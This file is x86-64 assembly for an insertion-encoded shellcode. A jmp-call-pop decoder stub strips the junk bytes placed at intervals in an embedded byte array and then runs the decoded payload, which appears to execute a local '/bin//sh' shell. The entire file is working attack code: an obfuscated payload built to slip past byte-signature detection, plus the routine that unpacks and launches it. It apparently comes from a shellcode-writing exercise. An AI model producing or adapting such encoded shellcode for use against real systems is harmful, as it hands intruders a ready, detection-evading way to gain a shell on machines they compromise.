;decode and run Inserction shellcode
;author: Javier Tejedor
;date: 13/10/2014
 
global _start
 
section .text
 
_start:
	jmp short shellcode
 
code:
	pop rsi
	push 32	;number of rounds
	pop rcx
	xor rbx, rbx
	inc rsi
 
set_counter:	;each 3 times, it will be executed
	push 3	
	pop rax
	inc rbx
	dec rsi
 
decoder:
	inc rsi	
	dec rax
	jz set_counter
 
move_memory:
	mov dl, byte[rsi + rbx]
	mov byte [rsi], dl	;create movement in memory
	loop decoder
jmp short shellcodeEncoded	;jumps to the shellcode decoded

shellcode:
	call code
	shellcodeEncoded: db 0x48,0xad,0x31,0xc0,0x60,0x50,0x48,0x83,0xbb,0x2f,0x4f,0x62,0x69,0x3e,0x6e,0x2f,0xe5,0x2f,0x73,0xb8,0x68,0x53,0x88,0x48,0x89,0xb9,0xe7,0x50,0x2c,0x48,0x89,0x5c,0xe2,0x57,0x5b,0x48,0x89,0x96,0xe6,0x48,0x9a,0x83,0xc0,0x27,0x3b,0x0f,0xa8,0x05
